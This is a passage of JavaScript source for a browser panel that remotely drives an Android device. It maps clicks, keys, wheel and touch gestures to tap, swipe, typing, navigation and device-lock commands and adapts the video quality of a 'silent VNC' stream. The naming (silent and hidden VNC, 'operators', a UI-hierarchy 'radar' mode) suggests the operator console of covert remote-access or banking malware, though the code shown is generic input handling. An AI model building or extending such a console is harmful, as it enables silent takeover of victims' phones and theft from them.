  // ── Quality adaptation ─────────────────────────────────────────────────────
  _adaptQuality() {
    const fps = this.fps;
    if (fps === 0) { this._stableLow = this._stableHigh = 0; return; }

    if (fps < 4)       { this._stableLow++;  this._stableHigh = 0; }
    else if (fps > 18) { this._stableHigh++; this._stableLow  = 0; }
    else               { this._stableLow = this._stableHigh = 0; }

    if (this._stableLow >= 6 && this._quality > 15) {
      this._quality = Math.max(15, this._quality - 10);
      this._updateQualitySlider();
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableLow = 0;
    }
    if (this._stableHigh >= 8 && this._quality < 80) {
      this._quality = Math.min(80, this._quality + 5);
      this._updateQualitySlider();
      if (this._running) this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableHigh = 0;
    }
  }

  _updateQualitySlider() {
    const sl = this.container.querySelector('#_hv_q');
    const lb = this.container.querySelector('#_hv_ql');
    if (sl) sl.value = this._quality;
    if (lb) lb.textContent = this._quality + '%';
  }

  // ── Coordinate mapping ─────────────────────────────────────────────────────
  // getBoundingClientRect is post-transform — accounts for both zoom (CSS scale)
  // and pan (CSS translate) automatically. No adjustments needed.
  _mapCoords(clientX, clientY) {
    const r  = this.canvas.getBoundingClientRect();
    const sx = (this.frameW / r.width)  / this._zoom;
    const sy = (this.frameH / r.height) / this._zoom;
    return {
      x: Math.max(0, Math.min(1, ((clientX - r.left) * sx) / this.frameW)),
      y: Math.max(0, Math.min(1, ((clientY - r.top)  * sy) / this.frameH)),
    };
  }

  // ── Commands ───────────────────────────────────────────────────────────────
  _cmd(cmd, args = {}) {
    this._send({ type: 'cmd', target: this.deviceId, cmd, args });
  }

  _sendOp(obj) { this._send(obj); }

  // ── Input ──────────────────────────────────────────────────────────────────
  _bindInput() {
    const c = this.canvas;
    const SWIPE_THRESHOLD = 0.03;

    // Cursor tracking
    this._cursor     = null;
    this._cursorDown = false;

    c.addEventListener('mousemove', e => {
      // Pan mode (Shift+drag or middle-drag)
      if (this._panning && this._panOrigin) {
        this._panX = this._panOriginPan.x + (e.clientX - this._panOrigin.x);
        this._panY = this._panOriginPan.y + (e.clientY - this._panOrigin.y);
        this._applyZoom();
        return;
      }

      this._cursor = this._mapCoords(e.clientX, e.clientY);

      // Hold-scroll — continuous SWIPE at 80ms throttle while mouse held
      if (this._mouse.down) {
        const now = performance.now();
        if (now - this._mouse.lastScrollTime > 80) {
          const from = this._mouse.lastScrollPos || this._mouse.origin;
          const pos  = this._cursor;
          if (Math.hypot(pos.x - from.x, pos.y - from.y) > 0.005) {
            this._cmd('SWIPE', {
              x1: from.x, y1: from.y,
              x2: pos.x,  y2: pos.y,
              duration: 80,
            });
            this._mouse.lastScrollPos   = { ...pos };
            this._mouse.lastScrollTime  = now;
            this._mouse.holdScrollFired = true;
          }
        }
      }
    });

    c.addEventListener('mouseleave', () => {
      this._cursor = null;
      if (this._panning) this._panning = false;
    });

    c.addEventListener('contextmenu', e => {
      e.preventDefault();
      const pos = this._mapCoords(e.clientX, e.clientY);
      this._cmd('LONG_PRESS', { x: pos.x, y: pos.y });
      this._spawnRipple(pos.x, pos.y, 'long');
    });

    c.addEventListener('mousedown', e => {
      e.preventDefault();
      // Middle-click or Shift+click → pan
      if (e.button === 1 || (e.button === 0 && e.shiftKey)) {
        this._panning        = true;
        this._panOrigin      = { x: e.clientX, y: e.clientY };
        this._panOriginPan   = { x: this._panX, y: this._panY };
        return;
      }
      if (e.button !== 0) return;
      this._mouse.down            = true;
      this._mouse.origin          = this._mapCoords(e.clientX, e.clientY);
      this._mouse.t               = performance.now();
      this._mouse.holdScrollFired = false;
      this._mouse.lastScrollPos   = null;
      this._mouse.lastScrollTime  = 0;
      c.focus();
    });

    c.addEventListener('mouseup', e => {
      if (e.button === 1) { this._panning = false; return; }
      if (this._panning)  { this._panning = false; return; }
      if (!this._mouse.down) return;
      this._mouse.down = false;

      // If hold-scroll fired, suppress final gesture dispatch
      if (this._mouse.holdScrollFired) {
        this._mouse.holdScrollFired = false;
        return;
      }

      const up  = this._mapCoords(e.clientX, e.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
        const type = dur < 500 ? 'TAP' : 'LONG_PRESS';
        this._cmd(type, { x: this._mouse.origin.x, y: this._mouse.origin.y });
        this._spawnRipple(this._mouse.origin.x, this._mouse.origin.y,
          type === 'LONG_PRESS' ? 'long' : 'tap');
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y,
          duration: Math.max(80, Math.min(Math.round(dur), 1500)),
        });
      }
    });

    c.addEventListener('mouseleave', () => { this._mouse.down = false; });

    c.addEventListener('wheel', e => {
      e.preventDefault();
      if (e.ctrlKey || e.metaKey) {
        this._zoom = Math.max(0.5, Math.min(4, this._zoom * (e.deltaY < 0 ? 1.1 : 0.9)));
        this._applyZoom();
        const sl = this.container.querySelector('#_hv_zoom');
        const lb = this.container.querySelector('#_hv_zl');
        if (sl) sl.value = Math.min(400, Math.round(this._zoom * 100));
        if (lb) lb.textContent = Math.round(this._zoom * 100) + '%';
        return;
      }
      const pos   = this._mapCoords(e.clientX, e.clientY);
      const delta = e.deltaY > 0 ? 0.25 : -0.25;
      this._cmd('SWIPE', {
        x1: pos.x, y1: pos.y,
        x2: pos.x, y2: Math.max(0.01, Math.min(0.99, pos.y - delta)),
        duration: 200,
      });
    }, { passive: false });

    c.addEventListener('keydown', e => {
      e.preventDefault();

      // Shortcut legend toggle
      if (e.key === '?') { this._toggleShortcuts(); return; }

      if (e.ctrlKey || e.metaKey) {
        switch (e.key.toLowerCase()) {
          case 'h': this._cmd('HOME',    {}); return;
          case 'b': this._cmd('BACK',    {}); return;
          case 'r': this._cmd('RECENTS', {}); return;
          case 'v':
            navigator.clipboard.readText().then(text => {
              if (text) {
                this._cmd('SET_CLIPBOARD', { text });
                setTimeout(() => this._cmd('TYPE', { text }), 100);
              }
            }).catch(() => {});
            return;
          case 'c': this._cmd('LOCK_DEVICE', {}); return;
          case 's': this.start(); return;
          case 'q': this.stop();  return;
        }
      }

      switch (e.key) {
        case 'Escape':    this._cmd('BACK',           {}); return;
        case 'F1':        this._cmd('HOME',           {}); return;
        case 'F2':        this._cmd('RECENTS',        {}); return;
        case 'F3':        this._cmd('QUICK_SETTINGS', {}); return;
        case 'F5':        this._cmd('FORCE_RESTART_VNC', {}); return;
        case 'Tab':       this._cmd('TYPE', { text: '\t' }); return;
        case 'Backspace': this._cmd('TYPE', { text: '\b' }); return;
        case 'Enter':     this._cmd('TYPE', { text: '\n' }); return;
        case 'Delete':    this._cmd('TYPE', { text: '\x7f' }); return;
        case 'ArrowUp':
          this._cmd('SWIPE', { x1: .5, y1: .65, x2: .5, y2: .3,  duration: 200 }); return;
        case 'ArrowDown':
          this._cmd('SWIPE', { x1: .5, y1: .3,  x2: .5, y2: .65, duration: 200 }); return;
        case 'ArrowLeft':
          this._cmd('SWIPE', { x1: .75, y1: .5, x2: .2, y2: .5,  duration: 200 }); return;
        case 'ArrowRight':
          this._cmd('SWIPE', { x1: .2,  y1: .5, x2: .75, y2: .5, duration: 200 }); return;
      }

      if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
        this._cmd('TYPE', { text: e.key });
      }
    });

    // Touch (tablet / mobile operators)
    c.addEventListener('touchstart', e => {
      e.preventDefault();
      if (e.touches.length === 2) {
        this._pinch.active = true;
        this._pinch.dist   = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        return;
      }
      const t = e.touches[0];
      this._mouse.down            = true;
      this._mouse.origin          = this._mapCoords(t.clientX, t.clientY);
      this._mouse.t               = performance.now();
      this._mouse.holdScrollFired = false;
      this._mouse.lastScrollPos   = null;
      this._mouse.lastScrollTime  = 0;
      c.focus();
    }, { passive: false });

    c.addEventListener('touchmove', e => {
      e.preventDefault();
      if (this._pinch.active && e.touches.length === 2) {
        const nd = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        this._zoom = Math.max(0.5, Math.min(4, this._zoom * (nd / this._pinch.dist)));
        this._pinch.dist = nd;
        this._applyZoom();
        const sl = this.container.querySelector('#_hv_zoom');
        const lb = this.container.querySelector('#_hv_zl');
        if (sl) sl.value = Math.min(400, Math.round(this._zoom * 100));
        if (lb) lb.textContent = Math.round(this._zoom * 100) + '%';
      }
    }, { passive: false });

    c.addEventListener('touchend', e => {
      e.preventDefault();
      this._pinch.active = false;
      if (!this._mouse.down) return;
      this._mouse.down = false;

      if (this._mouse.holdScrollFired) { this._mouse.holdScrollFired = false; return; }

      const t   = e.changedTouches[0];
      const up  = this._mapCoords(t.clientX, t.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD && dur < 500) {
        this._cmd('TAP', { x: this._mouse.origin.x, y: this._mouse.origin.y });
        this._spawnRipple(this._mouse.origin.x, this._mouse.origin.y, 'tap');
      } else if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
        this._cmd('LONG_PRESS', { x: this._mouse.origin.x, y: this._mouse.origin.y });
        this._spawnRipple(this._mouse.origin.x, this._mouse.origin.y, 'long');
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y,
          duration: Math.max(80, Math.round(dur)),
        });
      }
    }, { passive: false });
  }

  // ── LyReader passthrough ───────────────────────────────────────────────────
  onHierarchy(data) {
    if (this._mode !== 'radar') return;
    if (!this._lyReader) {
      const radarPanel = this.container.querySelector('#_hv_radarpanel');
      if (radarPanel && typeof LyReader !== 'undefined') {
        this._lyReader = new LyReader(
          radarPanel, this.deviceId,
          obj => this._send(obj),
          this.screenW, this.screenH
        );
      }
    }
    if (this._lyReader) this._lyReader.update(data);
  }

  onResize() {
    if (this._lyReader) this._lyReader.onResize();
  }

  // ── Cleanup ────────────────────────────────────────────────────────────────
  destroy() {
    this.stop();
    if (this._lyReader) { this._lyReader.destroy(); this._lyReader = null; }
    if (this._recorder && this._recActive) { this._recorder.stop(); }
    cancelAnimationFrame(this._rafId);
    clearInterval(this._qaTimer);
    clearInterval(this._sparkTimer);
    this._stopStallMonitor();
    if (this._pending) { this._pending.close(); this._pending = null; }
    this._pool.terminate();
  }
}
